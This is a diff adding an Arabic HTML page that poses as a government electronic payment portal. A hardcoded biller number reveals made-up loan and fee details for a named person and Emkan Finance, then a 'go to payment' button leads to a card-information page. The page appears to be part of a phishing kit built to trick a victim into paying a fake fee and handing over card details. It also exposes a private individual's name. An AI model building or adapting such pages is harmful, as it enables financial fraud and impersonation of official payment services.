@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>التحقق</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @font-face {
+      font-family: 'DS3';
+      src: url('fonts/ds3.woff') format('woff');
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'DS3', 'Segoe UI', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: url('Image1.png') no-repeat center / cover;
+      min-height: 120vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .verification-box {
+      background-color: rgba(255, 255, 255, 0.96);
+      padding: 20px;
+      border-radius: 20px;
+      width: 100%;
+      max-width: 350px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      margin-bottom: 30px; /* إضافة هامش سفلي للنص التمهيدي */
+    }
+
+    .verification-box h2 {
+      text-align: center;
+      color: orange;
+      margin-bottom: 20px;
+      font-size: 22px;
+    }
+
+    .verification-box input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+    }
+
+    .verify-btn, .go-btn {
+      background-color: orange;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .go-btn {
+      background-color: #007bff;
+      margin-top: 15px;
+    }
+
+    .verify-btn:hover {
+      background-color: #e68a00;
+    }
+
+    .go-btn:hover {
+      background-color: #0056b3;
+    }
+
+    .spinner {
+      display: none;
+      margin-top: 15px;
+      text-align: center;
+      font-size: 14px;
+      color: orange;
+    }
+
+    .details {
+      display: none;
+      margin-top: 20px;
+      background-color: #fff7e6;
+      padding: 15px;
+      border-radius: 10px;
+    }
+
+    .details h3 {
+      margin-top: 0;
+      text-align: center;
+    }
+
+    .details p {
+      margin: 10px 0;
+    }
+
+    .details img {
+      width: 18px;
+      vertical-align: middle;
+    }
+
+    .intro-text {
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 15px;
+      border-radius: 10px;
+      max-width: 90%;
+      width: 350px;
+      margin-top: 20px; /* هامش علوي لفصل النص عن نافذة التحقق */
+    }
+
+    .intro-text h1 {
+      color: white !important;
+      font-size: 24px !important;
+      margin-bottom: 10px;
+    }
+
+    .intro-text p {
+      color: white;
+      font-size: 16px;
+      line-height: 1.5;
+      margin: 0;
+    }
+
+    /* Media Queries for responsiveness */
+    @media (max-width: 480px) {
+      .intro-text h1 {
+        font-size: 20px !important;
+      }
+      
+      .intro-text p {
+        font-size: 14px;
+      }
+      
+      .verification-box {
+        padding: 15px;
+      }
+      
+      .verification-box h2 {
+        font-size: 20px;
+      }
+      
+      .verification-box input,
+      .verify-btn,
+      .go-btn {
+        font-size: 14px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="verification-box">
+    <h2>السداد عبر رقم المفوتر</h2>
+    <input type="text" id="code" placeholder="أدخل الرقم المفوتر">
+    <button class="verify-btn" onclick="verifyCode()">تحقق</button>
+    <div class="spinner" id="spinner">جارٍ التحقق...</div>
+
+    <div class="details" id="details">
+      <h3>رسوم جدولة الاقساط</h3>
+      <p><strong>اسم العميل:</strong>علي عبدالله علي الخميري</p>
+      <p><strong>الجهة:</strong> شركة إمكان للتمويل</p>
+      <p><strong>مبلغ التمويل:</strong> 
+        14,175 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Saudi_Riyal_Symbol.svg/1833px-Saudi_Riyal_Symbol.svg.png" alt="ريال سعودي">
+      </p>
+      <p><strong>القسط الشهري:</strong> 
+        444.93 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Saudi_Riyal_Symbol.svg/1833px-Saudi_Riyal_Symbol.svg.png" alt="ريال سعودي">
+      </p>
+      <p><strong>نسبة الفائدة:</strong>13%</p>
+      <p><strong>مدة السداد:</strong>36 شهر</p>
+      <p><strong>مبلغ الرسوم:</strong> 
+        124 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Saudi_Riyal_Symbol.svg/1833px-Saudi_Riyal_Symbol.svg.png" alt="ريال سعودي">
+      </p>
+      <button class="go-btn" onclick="window.location.href='Card-info.html'">اذهب للدفع</button>
+    </div>
+  </div>
+
+  <!-- النص الآن أسفل نافذة التحقق -->
+  <div class="intro-text">
+    <h1>بوابة الدفع الإلكترونية</h1>
+    <p>
+      نوفر لك طريقة آمنة وسريعة لإتمام عمليات الدفع الحكومية الخاصة بك عبر الإنترنت.
+      <br>
+      كل ما عليك هو إدخال رقم المفوتر للوصول إلى تفاصيل المعاملة والدفع مباشرة.
+    </p>
+  </div>
+
+  <script>
+    function verifyCode() {
+      const code = document.getElementById('code').value.trim();
+      const spinner = document.getElementById('spinner');
+      const details = document.getElementById('details');
+
+      if (code === '7568894') {
+        spinner.style.display = 'block';
+        setTimeout(() => {
+          spinner.style.display = 'none';
+          details.style.display = 'block';
+        }, 2000);
+      } else {
+        alert('الرقم غير صحيح، حاول مرة أخرى.');
+      }
+    }
+  </script>
+</body>
+</html>
